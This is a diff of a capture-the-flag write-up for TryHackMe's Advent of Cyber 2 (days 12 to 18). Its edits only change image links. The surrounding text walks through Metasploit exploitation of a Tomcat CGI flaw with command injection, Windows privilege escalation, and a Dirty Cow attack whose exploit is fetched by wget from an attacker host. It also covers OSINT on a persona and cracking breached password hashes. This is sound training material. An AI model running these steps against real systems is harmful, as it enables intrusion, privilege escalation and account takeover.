-   ![CVE Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Exploit_CVE.png)
+   ![CVE Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Exploit_CVE.png)
 
    ><details><summary>Click for answer</summary>CVE-2019-0232</details>
 
@@ -673,17 +673,17 @@ In this task we will be using MetaSploit to get access to our target machine.
 
    To find the flag I tried using the CGI browser exploit mentioned in the challenge. Appending an extra argument to a script located on the server. This mainly works as we know (roughly) what to look for. Assuming the scripts are located in the `/cgi-bin/` directory, we can navigate to the script (if it exists).
    
-   ![CGI Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Script.png)
+   ![CGI Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_CGI_Script.png)
    
    Appending the `?&dir` command, we can indeed parse extra information from the server. Apparently, the flag is located in the same folder.
    
-   ![CGI Dir](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Dir.png)
+   ![CGI Dir](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_CGI_Dir.png)
    
    Maybe we can get the file contents from here directly. After encoding `type flag.txt` in CyberChef, I tried appending this to the URL.
    
-   ![Cyber Chef Encode](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_URL_Encode.png)
+   ![Cyber Chef Encode](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_URL_Encode.png)
    
-   ![CGI Type](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_CGI_Type.png)
+   ![CGI Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_CGI_Type.png)
    
    Unfortunately, it didn't seem to work. So I had to try a different method. Enter MetaSploit!
    
@@ -693,7 +693,7 @@ In this task we will be using MetaSploit to get access to our target machine.
    search apache cgi
    ```
    
-   ![MSF Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Search.png)
+   ![MSF Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Search.png)
    
    #2 looks to be what we are looking for. `enableCmdLineArguments` is also mentioned in the CVE. Next we run:
    
@@ -712,15 +712,15 @@ In this task we will be using MetaSploit to get access to our target machine.
    options
    ```
    
-   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Options.png)
+   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Options.png)
    
    So we can just use `run` to let the exploit start. This gives us a nice session which we can move into with `shell`.
    
-   ![MSF Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Run.png)
+   ![MSF Run](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Run.png)
    
    Now we can enumerate the directory and view the contents of the flag (`type` does work here fortunately).
    
-   ![MSF Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Flag1.png)
+   ![MSF Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Flag1.png)
    
    ><details><summary>Click for answer</summary>thm{whacking_all_the_elves}</details>
 
@@ -728,17 +728,17 @@ In this task we will be using MetaSploit to get access to our target machine.
 
    Unfortunately, I couldn't get this to work with the post exploit scripts as mentioned in the hint. I did, however, manage to use `getsystem` to gain admin priveleges.
    
-   ![Get System](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Get_System.png)
+   ![Get System](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Get_System.png)
    
    The first method I used (which didn't work yet) was as follows:
    
    `search exploit suggest` this gave us the exploit suggestion module.
    
-   ![MSF Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest.png)
+   ![MSF Suggester](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest.png)
    
    For this modules we only needed to add our session number.
    
-   ![MSF Suggester Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest_Options.png)
+   ![MSF Suggester Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_MSF_Suggest_Options.png)
    
    Unfortunately, I couldn't get it to connect. I will have to look at some Priv Esc rooms for this one.
    
@@ -755,7 +755,7 @@ In this task we will be using MetaSploit to get access to our target machine.
    search exploit windows local path
    ```
    
-   ![Priv Esc Module Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Priv_Module_Search.png)
+   ![Priv Esc Module Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Priv_Module_Search.png)
    
    Looks like there is another module we can try `unquoted_service_path`.
    
@@ -769,11 +769,11 @@ In this task we will be using MetaSploit to get access to our target machine.
    
    We have now loaded the module and set the necessary options. Our current `user` session on the machine is `1`. Now type `run` to start the exploit.
    
-   ![Priv Esc Options](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Priv_Options.png)
+   ![Priv Esc Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Priv_Options.png)
    
    Looks like it worked. To check, we can run the `getuid` command again to find out which user we are.
    
-   ![Priv Esc Getuid](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Escalated.png)
+   ![Priv Esc Getuid](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2012/Ready_Set_Metasploit_Escalated.png)
    
    Success! We have now escalated our priveleges on this machine!
 
@@ -785,7 +785,7 @@ In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escal
 
    Running an nmap scan with `nmap -sV 10.10.202.23` we can get more information on the services running on the machine. 
    
-   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Nmap.png)
+   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Nmap.png)
 
    ><details><summary>Click for answer</summary>telnet</details>
 
@@ -793,7 +793,7 @@ In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escal
 
    Now we now the port used for telnet (23), we can use this protocol to log into the system using `telnet 10.10.202.23`. We are greeted with a message containing credentials we can use.
    
-   ![Telnet Log In](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Telnet_Log_In.png)
+   ![Telnet Log In](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Telnet_Log_In.png)
 
    ><details><summary>Click for answer</summary>clauschristmas</details>
 
@@ -802,7 +802,7 @@ In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escal
    Several usefull enumeration commands can be found [here](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 ). One of the commands we can use to find information about the system is `cat /etc/*release`.
 
-   ![System Info](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Release.png)
+   ![System Info](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Release.png)
 
    ><details><summary>Click for answer</summary>ubuntu 12.04</details>
 
@@ -826,19 +826,19 @@ In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escal
    python -c import pty; pty.spawn("/bin/bash")'
    ```
    
-   ![Stabalize shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Stabalize.png)
+   ![Stabalize shell](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Stabalize.png)
    
    Although unneccesary for this part, it did make things easier down the road.
    
-   ![Cookie Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Cookies.png)
+   ![Cookie Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Cookies.png)
 
    ><details><summary>Click for answer</summary>grinch</details>
 
 8. What is the verbatim syntax you can use to compile, taken from the real C source code comments?
 
-   After doing some research via [https://dirtycow.ninja/](https://dirtycow.ninja/), I found the original script used on [Github](https://github.com/FireFart/dirtycow/blob/master/dirty.c). On this page it was writen how to compile the script.
+   After doing some research via [https://dirtycow.ninja/](https://dirtycow.ninja/), I found the original script used on [Github](https://github.com/FireFart/dirtycow/raw/master/dirty.c). On this page it was writen how to compile the script.
    
-   ![Compile Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Compile.png)
+   ![Compile Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Compile.png)
 
    ><details><summary>Click for answer</summary>gcc -pthread dirty.c -o dirty -lcrypt</details>
 
@@ -856,7 +856,7 @@ In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escal
    wget http://10.18.78.136:8080/dirty.c
    ```
    
-   ![Send Cow Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Send_Cow.png)
+   ![Send Cow Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Send_Cow.png)
    
    I had a different name for the script and the challenge required a specific name `dirty.c`. That is why the commands differ from the images which were taken before that realization..
    
@@ -868,7 +868,7 @@ In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escal
    ./dirty.c
    ```
    
-   ![Compile Run](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Compile_Run.png)
+   ![Compile Run](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Compile_Run.png)
    
    The message shows us which user has been created. Examing the `/home/` folder or the `/etc/passwd` file confirmed this. This is also the same name that was given in the script itself before we uploaded it to the machine.
 
@@ -878,7 +878,7 @@ In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escal
 
    Now we can use `su firefart` to swith to this newly created user and navigate to the root folder. Here we find another message with the last instructions.
    
-   ![Root Message](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Message.png)
+   ![Root Message](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Message.png)
    
    Looks like we need to create a file and then generate a checksum for the directory. We can do so with the following commands (**Make sure you are in the correct directory**):
    
@@ -887,7 +887,7 @@ In this task we will be utilizing a kernel exploit 'Dirty Cow' in order to escal
    tree | md5sum
    ```
    
-   ![Md5sum](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2013/Coal_Md5sum.png)
+   ![Md5sum](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2013/Coal_Md5sum.png)
 
    ><details><summary>Click for answer</summary>8b16f00dd3b51efadb02c1df7f8427cc</details>
 
@@ -901,7 +901,7 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
    After we find the page for 'IGuidetheClaus2020' we can click on the comments tab to view his comment history.
    
-   ![Reddit Comment History](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Reddit_History.png)
+   ![Reddit Comment History](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Reddit_History.png)
 
    ><details><summary>Click for answer</summary>https://www.reddit.com/user/IGuidetheClaus2020/comments/</details>
 
@@ -909,7 +909,7 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
    Looking at some of his comments, we find the following:
    
-   ![Reddit Born](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Reddit_Born.png)
+   ![Reddit Born](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Reddit_Born.png)
 
    ><details><summary>Click for answer</summary>Chicago</details>
 
@@ -917,7 +917,7 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
    In the last comment he also mentioned his creator Robert. An online search can give us his last name.
    
-   ![Creator Name](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Creator_Name.png)
+   ![Creator Name](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Creator_Name.png)
 
    ><details><summary>Click for answer</summary>May</details>
 
@@ -925,7 +925,7 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
    We can use several of the mentioned websites and programs to find any related user accounts for Rudolph. We manage to find an account on Twitter.
    
-   ![Accounts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Accounts.png)
+   ![Accounts](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Accounts.png)
 
    ><details><summary>Click for answer</summary>twitter</details>
 
@@ -933,7 +933,7 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
    After a search for his username on twitter we find his handle on Twitter.
    
-   ![Twitter Handle](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Twitter.png)
+   ![Twitter Handle](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Twitter.png)
 
    ><details><summary>Click for answer</summary>IGuideClaus2020</details>
 
@@ -941,7 +941,7 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
    Going through some of his tweets, we can find out what his recent favorite show is. The message is from nov 2020, but for this challenge that was about a month ago.
    
-   ![Favorite Show](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_TV_Show.png)
+   ![Favorite Show](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_TV_Show.png)
 
    ><details><summary>Click for answer</summary>Bachelorette</details>
 
@@ -949,7 +949,7 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
    We also find several posts about a parade he took part in. We can do a reverse image search on these images to find out where this was taken.
    
-   ![Reverse Image Search](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Reverse_Image.png)
+   ![Reverse Image Search](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Reverse_Image.png)
 
    ><details><summary>Click for answer</summary>Chicago</details>
 
@@ -957,25 +957,25 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
    One Twitter post revealed a larger image, which could possibly contain some interesting data. 
    
-   ![Large Image](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Large_Image.png)
+   ![Large Image](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Large_Image.png)
    
    Although the coordinates where quickly found using `exiftools`, I had a hard time getting the right answer in the correct format, as many websites converted it slightly different.
    
-   ![Exif Results](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Exif.png)
+   ![Exif Results](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Exif.png)
    
    Plugging the results into Google Maps yielded something close, but it wasn't correct (it was of by only 0.000001).
    
-   ![Coordinates 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Coordinates_1.png)
+   ![Coordinates 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Coordinates_1.png)
    
    Another website was slightly off as well (by 0.000002).
    
-   ![Coordinates 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Coordinates_2.png)
+   ![Coordinates 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Coordinates_2.png)
    
    A third site contained a link to Google Maps which was correct at last!
    
-   ![Coordinates 3](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Coordinates_3.png)
+   ![Coordinates 3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Coordinates_3.png)
    
-   ![Coordinates 4](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Coordinates_4.png)
+   ![Coordinates 4](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Coordinates_4.png)
 
    ><details><summary>Click for answer</summary>41.891815,-87.624277</details>
 
@@ -989,23 +989,23 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
     We can do a search on [https://haveibeenpwned.com/](https://haveibeenpwned.com/) for the email address we found on twitter.
     
-    ![Email Address](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Email.png)
+    ![Email Address](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Email.png)
     
     Although, it did mention a breach, no passwords were shown. Unfortunately, the provided site [http://scylla.so/](http://scylla.so/) was currently offline. So I had to find an alternative website. I searched through several of the below alternatives I could find:
     
-    ![H8mail Sites](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_h8mail.png)
+    ![H8mail Sites](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_h8mail.png)
     
     Only [https://breachdirectory.org/](https://breachdirectory.org/) seemed to work. Unfortunately, it only showed a partial password associated with the email. 
     
-    ![Breached Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Passwords.png)
+    ![Breached Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Passwords.png)
     
     Doing a quick search through the `rockyou` password list, we found several hits. We could just try all there, but that wouldn't be practical in other situations.
     
-    ![Rockyou Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Rockyou.png)
+    ![Rockyou Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Rockyou.png)
     
     Luckily, it does show us the SHA1 hash of the password. This means we can use `hashcat` to possibly crack the password. We can do a normal hashcat search with the following command after saving the hashes to a file:
     
-    ![Hashes](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Hashes.png)
+    ![Hashes](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Hashes.png)
     
     ```cmd
     hashcat -m 100 rudolphpass.txt /usr/share/wordlists/rockyou.txt
@@ -1025,11 +1025,11 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
     hashcat -m 100 rudolphpass.hash rudolphpass.txt
     ```
     
-    ![Hashcat Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Hashcat_1.png)
+    ![Hashcat Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Hashcat_1.png)
     
     Boom, we managed to find our password, unfortunately, the second one was not found. Luckily, the first one was all we needed for the question.
     
-    ![Hashcat Result](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Hashcat_2.png)
+    ![Hashcat Result](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Hashcat_2.png)
 
     ><details><summary>Click for answer</summary>spygame</details>
 
@@ -1037,7 +1037,7 @@ In this task we will be using OSINT to find out where Rudolph is. The only thing
 
     In one of his Twitter posts, he mentioned something about the Marriott hotel. Lets find any hotels in this area.
     
-    ![Marriott Hotel](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2014/Rudolph_Hotel.png)
+    ![Marriott Hotel](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2014/Rudolph_Hotel.png)
 
     ><details><summary>Click for answer</summary>540</details>
 
@@ -1051,7 +1051,7 @@ In this task we will be learning some basics from Python. More resources can be 
 
 1. What's the output of True + True?
 
-   ![Python True](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2015/Python_True.png)
+   ![Python True](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2015/Python_True.png)
 
    ><details><summary>Click for answer</summary>2</details>
 
@@ -1063,7 +1063,7 @@ In this task we will be learning some basics from Python. More resources can be 
 
 3. What is the output of bool("False")?
 
-   ![Python Bool](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2015/Python_Bool.png)
+   ![Python Bool](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2015/Python_Bool.png)
 
    ><details><summary>Click for answer</summary>True</details>
 
@@ -1079,7 +1079,7 @@ In this task we will be learning some basics from Python. More resources can be 
 
    For this we can use the interactive editor or create a script and run that.
    
-   ![Python Print](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2015/Python_Print.png)
+   ![Python Print](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2015/Python_Print.png)
 
    ><details><summary>Click for answer</summary>[1, 2, 3, 6]</details>
 
@@ -1097,7 +1097,7 @@ In this task we will be using the knowledge whe gained about Python from the pre
 
    To get the port number we can run an nmap scan on the target.
    
-   ![Python Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2016/Python_Nmap.png)
+   ![Python Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Nmap.png)
 
    ><details><summary>Click for answer</summary>80</details>
 
@@ -1117,11 +1117,11 @@ In this task we will be using the knowledge whe gained about Python from the pre
    	print(i['href'])
    ```
    
-   ![Python Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2016/Python_Script.png)
+   ![Python Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Script.png)
    
    Running this gives us a list of links on the webpage, of which one seems to be the correct one.
    
-   ![Python Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2016/Python_Directory.png)
+   ![Python Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Directory.png)
 
    ><details><summary>Click for answer</summary>/api/</details>
 
@@ -1140,9 +1140,9 @@ In this task we will be using the knowledge whe gained about Python from the pre
    
    The range function gives us all odd numbers from 1-99 for us to iterate through.
    
-   ![Python Api Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2016/Python_Api_Script.png)
+   ![Python Api Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Api_Script.png)
    
-   ![Python Api Key](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2016/Python_Api_Key.png)
+   ![Python Api Key](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2016/Python_Api_Key.png)
 
    ><details><summary>Click for answer</summary>Winter Wonderland, Hyde Park, London.</details>
 
@@ -1166,7 +1166,7 @@ scp elfmceager@10.10.83.125:/home/elfmceager/challenge1 challenge1
 scp elfmceager@10.10.83.125:/home/elfmceager/file1 file1
 ```
 
-![Download Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2017/Reverse_Download_Files.png)
+![Download Files](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Download_Files.png)
 
 Now we can open `challenge1` and analyze it with Radare2.
 
@@ -1176,7 +1176,7 @@ r2 -d ./challenge1
 > aa
 ```
 
-![Main Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2017/Reverse_Main_Script.png)
+![Main Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Main_Script.png)
 
 Now we can search for an entrypoint with `afl | grep "main"`. Then we can view it using `pdf @main`.
 
@@ -1191,7 +1191,7 @@ Now we can search for an entrypoint with `afl | grep "main"`. Then we can view i
    > pdf			-> View current state
    ```
   
-   ![Breakpoint 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2017/Reverse_Breakpoint_1.png)
+   ![Breakpoint 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Breakpoint_1.png)
   
    As we can see in the image above, the program was stopped at our breakpoint. We can now view the value of local_ch with:
   
@@ -1199,7 +1199,7 @@ Now we can search for an entrypoint with `afl | grep "main"`. Then we can view i
    > px @rbp-0xc
    ```
   
-   ![Value 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2017/Reverse_Value_1.png)
+   ![Value 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Value_1.png)
   
    Looks like the value is `1`.
 
@@ -1216,7 +1216,7 @@ Now we can search for an entrypoint with `afl | grep "main"`. Then we can view i
    > pdf
    ```
    
-   ![Breakpoint 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2017/Reverse_Breakpoint_2.png)
+   ![Breakpoint 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Breakpoint_2.png)
    
    Now we can view the value of the registry with:
    
@@ -1224,7 +1224,7 @@ Now we can search for an entrypoint with `afl | grep "main"`. Then we can view i
    > dr
    ```
   
-   ![Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2017/Reverse_Registry.png)
+   ![Registry](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Registry.png)
    
    ><details><summary>Click for answer</summary>6</details>
 
@@ -1238,7 +1238,7 @@ Now we can search for an entrypoint with `afl | grep "main"`. Then we can view i
    > px @rbp-0x4
    ```
    
-   ![Next Step](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2017/Reverse_Next_Step.png)
+   ![Next Step](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2017/Reverse_Next_Step.png)
 
    ><details><summary>Click for answer</summary>6</details>
 
@@ -1252,11 +1252,11 @@ For this task we can use either [ILSpy](https://github.com/icsharpcode/ILSpy) or
 
    Lets open ILSpy and open the executable in it. Now we must search through the various entries for anything interesting. After opening the program itself we are immediatly greeted with a log in screen. Looks like we can start our search with the `MainForm`. Here we find a `buttonActivate` entry which could be of interest. Here we can indeed find the string that is used as a comparison.
    
-   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2018/Bits_Password.png)
+   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2018/Bits_Password.png)
    
    Using Dotpeek we can find the same result. However, this can be found in the MainForm itself.
    
-   ![Password 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2018/Bits_Password_2.png)
+   ![Password 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2018/Bits_Password_2.png)
 
    ><details><summary>Click for answer</summary>santapassword321</details>
 
@@ -1264,11 +1264,11 @@ For this task we can use either [ILSpy](https://github.com/icsharpcode/ILSpy) or
 
    On the same entry, we can also find and entry which displays a message with the flag.
    
-   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2018/Bits_Flag_1.png)
+   ![Flag 1](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2018/Bits_Flag_1.png)
    
    However, lets also log into the program and find the flag that way.
    
-   ![Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2018/Bits_Flag_2.png)
+   ![Flag 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2018/Bits_Flag_2.png)
 
    ><details><summary>Click for answer</summary>thm{046af}</details>
 
